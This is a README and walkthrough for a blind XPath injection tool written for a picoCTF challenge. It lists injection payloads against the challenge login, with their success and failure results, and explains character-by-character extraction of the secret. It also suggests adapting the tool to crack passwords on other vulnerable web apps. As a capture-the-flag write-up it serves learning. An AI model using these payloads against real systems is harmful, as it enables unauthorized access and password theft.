# XPATH-Injection-Password-finder
A tool using XPATH injections &amp; python to find the password of a user in the database. 
This tool is especially useful for blind XPATH injections!

This tool was wrote specifically for the picoCTF challenge 'X marks the Spot' however the code is simple and can be edited for 
to crack passwords on other web apps vulnerable to XPATH injections where we can use functions like starts-with(), count(), substring().

-----------------------------------------------------------------------
How it works

The vulnerable website is located at 'http://mercury.picoctf.net:53735'
and takes a username and a password. I orignally thought this was a SQL
injection but I was wrong.

If we enter with username:admin,password:admin
we get a login failed. I used BurpSuites proxy
to take this into the Repeater so I can easily send
accross expoits to see the result

We log in with a POST request and the data is in the form

name=admin&password=admin

If you enter a ' an error throws, nice.
'Internal Server Error'

If we enter 

name=' or '1'='1&pass=test (SUCCESS)

we get 'Your on the right path.' Great, this must be a blind SQL and all we get back is if the XPATH returns true or false
now, see if you follow my train of thoughts and hopefully understand how this works by the end of these conseutivve exploits

 name=' or 'x'='y&pass=test (FAIL)
 
 
 name' or 1=1 or 'x'='y&pass=test (SUCCESS) 
 
 
 name' or //*[starts-with(text(),'randomWord')] or 'x'='y&pass=test (FAIL)
 
 
 name' or //*[starts-with(text(),'picoCTF{')] or 'x'='y&pass=test (SUCCESS)
 
 
 name' or //*[starts-with(text(),'picoCTF{a')] or 'x'='y&pass=test (FAIL)
   .
   .
   .
name' or //*[starts-with(text(),'picoCTF{h')] or 'x'='y&pass=test (SUCCESS)


name' or //*[starts-with(text(),'picoCTF{ha')] or 'x'='y&pass=test (FAIL)
    .
    . 
    .
name' or //*[starts-with(text(),'picoCTF{h0')] or 'x'='y&pass=test (SUCCESS)
    
    
    
    basically you have to brute force each character and check if the new string exists in the data base (therefore will return true and add that character to the string now) or if it doesnt exist in the database it will return false and try the next character
 
